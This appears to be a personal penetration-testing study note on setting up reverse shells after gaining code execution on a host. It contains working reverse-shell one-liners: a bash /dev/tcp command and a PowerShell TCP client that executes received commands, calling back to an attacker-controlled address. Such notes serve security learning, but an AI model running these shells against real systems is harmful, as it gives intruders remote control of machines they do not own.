```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

Once a host has been compromised and we have RCE, setting up some form of persistent communication is a key part of [[5 - Post-Exploitation]].

## Types of Shells
### Reverse Shell
Connects back to our system and gives us control through a reverse connection. We setup a listener on our machine and then connect back to it from the target.
![[Netcat (nc)#Create a listener]]

Connecting back to our system with a shell is slightly more complex as it depends what we have available. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shells.

**Bash**
```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[Port] 0>&1'
```

**Netcat**
![[Netcat (nc)#Create a simple reverse shell]]

**Powershell**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
